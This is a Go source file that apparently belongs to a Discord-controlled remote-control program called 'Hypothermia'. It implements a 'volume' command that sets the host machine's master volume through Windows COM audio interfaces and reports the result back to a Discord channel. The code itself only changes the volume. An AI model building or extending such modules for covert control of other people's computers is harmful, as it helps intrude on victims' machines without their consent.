package commands

import (
	"fmt"
	"strconv"
	"syscall"
	"unsafe"

	"Hypothermia/src/misc"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	volUsage string = "[volume]"

	volArgsError  string = "🟥 Expected 1 argument."
	volConvError  string = "🟥 Failed to convert argument."
	volLevelError string = "🟥 Number needs to be between 0.0 and 1.0."

	volInitError     string = "🟥 Failed to initialize."
	colCreateError   string = "🟥 Failed to create instance."
	volGetAudioError string = "🟥 Failed to get audio endpoint."
	volActivateError string = "🟥 Failed to activate audio endpoint."
	volSetError      string = "🟥 Failed to set volume."

	volSetSuccess string = "🟩 Set volume to %.1f%%."
)

var (
	ole32 *syscall.LazyDLL = syscall.NewLazyDLL("ole32.dll")

	initialize   *syscall.LazyProc = ole32.NewProc("CoInitialize")
	create       *syscall.LazyProc = ole32.NewProc("CoCreateInstance")
	uninitialize *syscall.LazyProc = ole32.NewProc("CoUninitialize")
)

func (*VolumeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, volArgsError, volUsage), m.Reference())
		return
	}

	vol, err := strconv.ParseFloat(args[0], 32)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, volConvError, m.Reference())
		return
	}

	if vol < 0.0 || vol > 1.0 {
		s.ChannelMessageSendReply(m.ChannelID, volLevelError, m.Reference())
		return
	}

	res, _, _ := initialize.Call(0)
	if res != 0 && res != 0x80010106 {
		s.ChannelMessageSendReply(m.ChannelID, volInitError, m.Reference())
		return
	}

	defer uninitialize.Call()

	var enumerator *utils.IMMDeviceEnumerator
	res, _, _ = create.Call(
		uintptr(unsafe.Pointer(&utils.CLSID_MMDeviceEnumerator)),
		0,
		23,
		uintptr(unsafe.Pointer(&utils.IID_IMMDeviceEnumerator)),
		uintptr(unsafe.Pointer(&enumerator)),
	)

	if res != 0 {
		s.ChannelMessageSendReply(m.ChannelID, colCreateError, m.Reference())
		return
	}

	defer enumerator.Release()

	var device *utils.IMMDevice
	res, _, _ = syscall.SyscallN(
		enumerator.Vtbl.GetDefaultAudioEndpoint,
		uintptr(unsafe.Pointer(enumerator)),
		0,
		0,
		uintptr(unsafe.Pointer(&device)),
	)

	if res != 0 {
		s.ChannelMessageSendReply(m.ChannelID, volGetAudioError, m.Reference())
		return
	}

	defer device.Release()

	var endpoint *utils.IAudioEndpointVolume
	res, _, _ = syscall.SyscallN(
		device.Vtbl.Activate,
		uintptr(unsafe.Pointer(device)),
		uintptr(unsafe.Pointer(&utils.IID_IAudioEndpointVolume)),
		23,
		0,
		uintptr(unsafe.Pointer(&endpoint)),
	)

	if res != 0 {
		s.ChannelMessageSendReply(m.ChannelID, volActivateError, m.Reference())
		return
	}

	defer endpoint.Release()

	volume := float32(vol)
	res, _, _ = syscall.SyscallN(
		endpoint.Vtbl.SetMasterVolumeLevelScalar,
		uintptr(unsafe.Pointer(endpoint)),
		*(*uintptr)(unsafe.Pointer(&volume)),
		0,
	)

	if res != 0 {
		s.ChannelMessageSendReply(m.ChannelID, volSetError, m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(volSetSuccess, float64(vol)*100), m.Reference())
}

func (*VolumeCommand) Name() string {
	return "volume"
}

func (*VolumeCommand) Info() string {
	return "sets the volume of the users device"
}

type VolumeCommand struct{}
